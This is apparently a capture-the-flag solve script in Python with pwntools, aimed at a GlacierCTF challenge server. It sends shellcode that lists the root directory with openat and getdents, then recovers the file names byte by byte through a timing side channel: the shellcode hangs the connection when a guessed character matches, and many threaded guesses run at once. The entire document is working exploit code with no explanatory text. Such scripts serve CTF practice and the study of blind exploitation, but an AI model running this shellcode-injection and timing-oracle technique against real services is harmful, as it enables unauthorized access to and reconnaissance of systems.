from pwn import *
import string
import threading
import time

context(os='linux', arch='amd64')
candidates = '.' + string.ascii_letters + string.digits + '\x00'
found = ''

shell = b''
shell += asm(shellcraft.openat(0, '/'))
shell += asm(shellcraft.getdents(3, 'rsp', 0x500))

def test_candidate(ty, idx, payload, result):
    global found
    # io = process('./vuln', aslr=0)
    io = remote('chall.glacierctf.com', 13383)
    io.sendline(payload)

    start = time.time()
    io.recvall(timeout=4)
    now = time.time()

    if (now - start) > 4:
        found = ty

    io.close()

def readDir():
    global found
    results = []
    num = 0
    cnt = 0
    offset = 0
    filename = ''

    while True:
        threads = []
        result = []
        found = ''

        for ty in candidates:
            ty_ord = ord(ty)
            idx = 0x12 + cnt + offset
            payload = shell + asm((f"""
                add rsi, {idx}
                mov al, byte ptr [rsi]
                cmp al, {ty_ord}
                jne end
            loop:
                cmp rax, r11
                je end
                jmp loop
            end:
            """), arch='amd64')
            thread = threading.Thread(target=test_candidate, args=(ty, idx, payload, result))
            threads.append(thread)

        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join()

        filename += found
        if found != '':
            print(f"found : {filename}, {found}, {hex(cnt)}, {hex(idx)}")
            print(results)
        else:
            print(f"Not found : {hex(cnt)}, {hex(idx)}")
            break

        cnt += 1

        if ord(found) == 0:
            if filename == '\x00':
                return results
            num += 1
            offset = idx + (8 - (idx % 8))
            cnt = 0
            results.append(filename[:-1])
            filename = ''
            print(filename, results)


curdir = readDir()
print(curdir)